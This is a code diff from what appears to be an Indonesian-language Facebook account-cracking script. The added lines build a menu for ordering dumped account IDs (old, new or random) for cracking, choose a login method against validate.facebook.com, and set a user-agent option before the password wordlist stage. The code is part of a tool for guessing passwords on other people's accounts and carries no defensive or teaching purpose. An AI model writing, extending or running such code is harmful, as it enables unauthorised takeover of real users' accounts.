@@ -459,9 +459,57 @@ def cektahun(fx):
     return tahunz
 
 # -------------[ PENGATURAN-IDZ ]---------------#
+# -------------[ PENGATURAN-IDZ ]---------------#
 def setting():
-    console.print(f" {H2}• {P2}Total Id Dump :{H2} {len(id)} {P2} ")
-    Console().print(Panel(f"[bold white]Apakah Anda Ingin Mengunakan UA Manual ? Y/T",title=f"[bold green]Setting User-Agent",width=60,style=f"{color_panel}"))
+    Console().print(
+        Panel(
+            f"{P2}[{color_text}01{P2}] Crack akun Old [/]\n{P2}[{color_text}02{P2}] Crack Akun New [/]\n{P2}[{color_text}03{P2}] Crack Akun Random [[bold green]Recommended[bold white]][/]",
+            title="[bold green] %s " % (len(id)),
+            width=60,
+            style=f"{color_panel}",
+        )
+    )
+    hu = console.input(f" {H2}• {P2}Masukan : ")
+    if hu in ["1", "01"]:
+        for tua in sorted(id):
+            id2.append(tua)
+    elif hu in ["2", "02"]:
+        muda = []
+        for bacot in sorted(id):
+            muda.append(bacot)
+        bcm = len(muda)
+        bcmi = bcm - 1
+        for xmud in range(bcm):
+            id2.append(muda[bcmi])
+            bcmi -= 1
+    elif hu in ["3", "03"]:
+        for bacot in id:
+            xx = random.randint(0, len(id2))
+            id2.insert(xx, bacot)
+    else:
+        print(" [+] Pilih Yang Bener Sayang ")
+        exit()
+    Console().print(
+        Panel(
+            f"{P2}[{color_text}01{P2}] Login Site [bold green]validate.facebook.com[bold white] [/]",
+            width=60,
+            style=f"{color_panel}",
+            title="[bold green] Method",
+        )
+    )
+    hc = console.input(f" {H2}• {P2}Masukan : ")
+    if hc in ["1", "01"]:
+        method.append("validate")
+    else:
+        method.append("validate")
+    Console().print(
+        Panel(
+            f"[bold white]Apakah Anda Ingin Mengunakan UA Manual ? Y/T",
+            title=f"[bold green]Setting User-Agent",
+            width=60,
+            style=f"{color_panel}",
+        )
+    )
     uatambah = console.input(f" {H2}• {P2}Masukan : ")
     if uatambah in ["y", "Ya", "ya", "Y"]:
         ualuh.append("ya")
@@ -470,6 +518,7 @@ def setting():
     else:
         ualuh.append("tidak")
     passwrd()
+
 # -------------------[ BAGIAN-WORDLIST ]------------#
 def passwrd():
     global prog, des
